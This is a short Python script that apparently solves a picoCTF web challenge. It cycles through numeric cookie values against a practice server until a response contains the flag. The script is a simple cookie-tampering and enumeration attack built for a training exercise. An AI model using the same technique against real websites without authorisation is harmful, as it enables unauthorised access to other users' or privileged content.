import requests
url = "http://mercury.picoctf.net:29649/check"
cookie_name = "name"
for i in range(30):
    cookies = {cookie_name:str(i)}
    response = requests.get(url , cookies = cookies)
    if "picoCTF" in response.text:
        print(f"{response.text}")